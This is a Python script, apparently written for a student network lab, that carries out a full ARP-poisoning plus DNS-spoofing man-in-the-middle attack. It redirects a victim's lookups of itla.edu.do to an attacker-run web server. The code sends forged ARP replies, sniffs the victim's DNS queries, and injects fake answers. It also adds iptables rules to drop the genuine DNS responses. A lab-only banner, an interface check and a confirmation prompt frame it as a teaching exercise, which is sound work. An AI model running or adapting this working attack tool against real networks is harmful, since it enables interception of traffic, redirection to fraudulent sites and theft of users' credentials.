import os
import sys
import time
import signal
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer

try:
    from scapy.all import (
        ARP,
        Ether,
        IP,
        UDP,
        DNS,
        DNSQR,
        DNSRR,
        sendp,
        sniff,
        getmacbyip,
        get_if_hwaddr,
        conf,
    )
except Exception:
    print("ERROR: Scapy no está instalado.")
    print("Instala con: sudo apt update && sudo apt install -y python3-scapy")
    sys.exit(1)


running = True
iptables_rules = []
original_ip_forward = None


def require_root():
    if os.geteuid() != 0:
        print("Ejecuta como root:")
        print("sudo python3 dns-spoof-attack.py")
        sys.exit(1)


def ask(prompt, default):
    value = input(f"{prompt} [{default}]: ").strip()
    return value if value else default


def run_cmd(cmd):
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def read_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            return f.read().strip()
    except Exception:
        return "0"


def set_ip_forward(value):
    run_cmd(["sysctl", "-w", f"net.ipv4.ip_forward={value}"])


def add_iptables_rule(rule):
    run_cmd(rule)
    iptables_rules.append(rule)


def remove_iptables_rules():
    for rule in reversed(iptables_rules):
        delete_rule = rule.copy()
        if "-I" in delete_rule:
            delete_rule[delete_rule.index("-I")] = "-D"
        run_cmd(delete_rule)


class SpoofWebHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        html = f"""<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>DNS Spoofing Lab</title>
</head>
<body style="background:#111;color:white;font-family:Arial;text-align:center;padding-top:80px;">
  <h1>DNS Spoofing Exitoso</h1>
  <h2>itla.edu.do apunta al servicio web local del atacante</h2>
  <p>Servidor atacante: 20.25.8.46</p>
  <p>Cliente: {self.client_address[0]}</p>
</body>
</html>
"""
        data = html.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, fmt, *args):
        print(f"[HTTP] {self.client_address[0]} pidió {self.path}")


def start_web_server(fake_ip):
    try:
        httpd = HTTPServer(("0.0.0.0", 80), SpoofWebHandler)
        print(f"[+] Web local activa en http://{fake_ip}/")
        while running:
            httpd.handle_request()
    except OSError as e:
        print(f"[!] No pude abrir el puerto 80: {e}")
        print("[!] Cierra Apache/Nginx si están usando el puerto 80.")


def arp_poison_loop(iface, attacker_mac, victim_ip, victim_mac, gateway_ip, gateway_mac):
    print("[+] ARP spoofing activo")
    print(f"[+] Víctima {victim_ip} creerá que {gateway_ip} está en {attacker_mac}")
    print(f"[+] Router {gateway_ip} creerá que {victim_ip} está en {attacker_mac}")

    while running:
        pkt1 = (
            Ether(dst=victim_mac, src=attacker_mac)
            / ARP(
                op=2,
                psrc=gateway_ip,
                pdst=victim_ip,
                hwsrc=attacker_mac,
                hwdst=victim_mac,
            )
        )

        pkt2 = (
            Ether(dst=gateway_mac, src=attacker_mac)
            / ARP(
                op=2,
                psrc=victim_ip,
                pdst=gateway_ip,
                hwsrc=attacker_mac,
                hwdst=gateway_mac,
            )
        )

        sendp(pkt1, iface=iface, verbose=False)
        sendp(pkt2, iface=iface, verbose=False)
        time.sleep(2)


def restore_arp(iface, victim_ip, victim_mac, gateway_ip, gateway_mac):
    print("\n[+] Restaurando ARP...")

    for _ in range(5):
        pkt1 = (
            Ether(dst=victim_mac, src=gateway_mac)
            / ARP(
                op=2,
                psrc=gateway_ip,
                pdst=victim_ip,
                hwsrc=gateway_mac,
                hwdst=victim_mac,
            )
        )

        pkt2 = (
            Ether(dst=gateway_mac, src=victim_mac)
            / ARP(
                op=2,
                psrc=victim_ip,
                pdst=gateway_ip,
                hwsrc=victim_mac,
                hwdst=gateway_mac,
            )
        )

        sendp(pkt1, iface=iface, verbose=False)
        sendp(pkt2, iface=iface, verbose=False)
        time.sleep(0.3)


def normalize_domain(domain):
    return domain.lower().strip().rstrip(".")


def is_target_domain(qname, domain):
    qname = normalize_domain(qname)
    domain = normalize_domain(domain)
    return qname == domain or qname == f"www.{domain}"


def dns_spoof(pkt, iface, attacker_mac, victim_ip, fake_ip, target_domain):
    if not pkt.haslayer(IP) or not pkt.haslayer(UDP) or not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
        return

    if pkt[IP].src != victim_ip:
        return

    if pkt[DNS].qr != 0:
        return

    try:
        qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
    except Exception:
        return

    qtype = pkt[DNSQR].qtype

    if not is_target_domain(qname, target_domain):
        print(f"[DNS] Consulta ignorada: {qname}")
        return

    if qtype not in (1, 255):
        print(f"[DNS] {qname} pidió tipo {qtype}, no A. Ignorado.")
        return

    dns_response = (
        Ether(dst=pkt[Ether].src, src=attacker_mac)
        / IP(
            src=pkt[IP].dst,
            dst=pkt[IP].src,
            ttl=64,
            flags=0
        )
        / UDP(
            sport=53,
            dport=pkt[UDP].sport
        )
        / DNS(
            id=pkt[DNS].id,
            qr=1,
            opcode=0,
            aa=1,
            tc=0,
            rd=pkt[DNS].rd,
            ra=1,
            z=0,
            rcode=0,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=pkt[DNSQR].qname,
                type="A",
                rclass="IN",
                ttl=300,
                rdata=fake_ip,
            ),
        )
    )

    # Recalcular checksums automáticamente
    if IP in dns_response:
        del dns_response[IP].chksum
    if UDP in dns_response:
        del dns_response[UDP].chksum

    # Enviar varias veces para que VPCS no pierda la respuesta
    for _ in range(5):
        sendp(dns_response, iface=iface, verbose=False)
        time.sleep(0.05)

    print(f"[DNS SPOOF] {qname} -> {fake_ip} enviado a {pkt[IP].src}")

def stop_handler(signum, frame):
    global running
    running = False


def main():
    global running, original_ip_forward

    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    require_root()

    print("""
====================================================
 DNS SPOOFING / DNS POISONING MITM LAB
 ARP Spoof + DNS Spoof + Web Local
 Uso exclusivo en laboratorio GNS3 autorizado
====================================================
""")

    iface = ask("Interfaz de ataque", "eth0")
    victim_ip = ask("IP víctima", "20.25.8.47")
    gateway_ip = ask("IP router/gateway", "20.25.8.45")
    fake_ip = ask("IP web local atacante", "20.25.8.46")
    target_domain = ask("Dominio a falsificar", "itla.edu.do")

    if iface != "eth0":
        print("[!] Por seguridad del lab, usa eth0. eth1 es NAT/Internet.")
        sys.exit(1)

    confirm = ask("Escribe YES para iniciar el ataque", "NO")
    if confirm != "YES":
        print("Cancelado.")
        return

    attacker_mac = get_if_hwaddr(iface)

    print("[+] Resolviendo MAC de víctima y gateway...")
    victim_mac = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not victim_mac:
        print(f"[!] No pude resolver MAC de la víctima {victim_ip}")
        print("[!] Verifica que la PC esté encendida y en la misma VLAN.")
        sys.exit(1)

    if not gateway_mac:
        print(f"[!] No pude resolver MAC del gateway {gateway_ip}")
        print("[!] Verifica que R1 esté encendido y en la misma VLAN.")
        sys.exit(1)

    print(f"[+] Atacante: {fake_ip} MAC {attacker_mac}")
    print(f"[+] Víctima:  {victim_ip} MAC {victim_mac}")
    print(f"[+] Gateway:  {gateway_ip} MAC {gateway_mac}")

    original_ip_forward = read_ip_forward()
    set_ip_forward("1")

    # Bloquea respuestas DNS legítimas que vengan del DNS real hacia la víctima.
    # Así la respuesta falsa de Kali gana.
    add_iptables_rule([
        "iptables", "-I", "FORWARD",
        "-p", "udp",
        "--sport", "53",
        "-d", victim_ip,
        "-j", "DROP",
    ])

    add_iptables_rule([
        "iptables", "-I", "FORWARD",
        "-p", "tcp",
        "--sport", "53",
        "-d", victim_ip,
        "-j", "DROP",
    ])

    web_thread = threading.Thread(target=start_web_server, args=(fake_ip,), daemon=True)
    web_thread.start()

    poison_thread = threading.Thread(
        target=arp_poison_loop,
        args=(iface, attacker_mac, victim_ip, victim_mac, gateway_ip, gateway_mac),
        daemon=True,
    )
    poison_thread.start()

    print("[+] Sniffing DNS activo")
    print("[+] En la víctima prueba: ping itla.edu.do")
    print("[+] Si tienes víctima Linux: curl http://itla.edu.do")
    print("[+] Presiona Ctrl+C para detener y restaurar")

    try:
        sniff(
            iface=iface,
            filter=f"udp port 53 and host {victim_ip}",
            prn=lambda pkt: dns_spoof(
                pkt,
                iface,
                attacker_mac,
                victim_ip,
                fake_ip,
                target_domain,
            ),
            store=False,
        )
    except KeyboardInterrupt:
        pass
    finally:
        running = False
        restore_arp(iface, victim_ip, victim_mac, gateway_ip, gateway_mac)
        remove_iptables_rules()
        set_ip_forward(original_ip_forward)
        print("[+] Limpieza completada")
        print("[+] Ataque detenido")


if __name__ == "__main__":
    main()
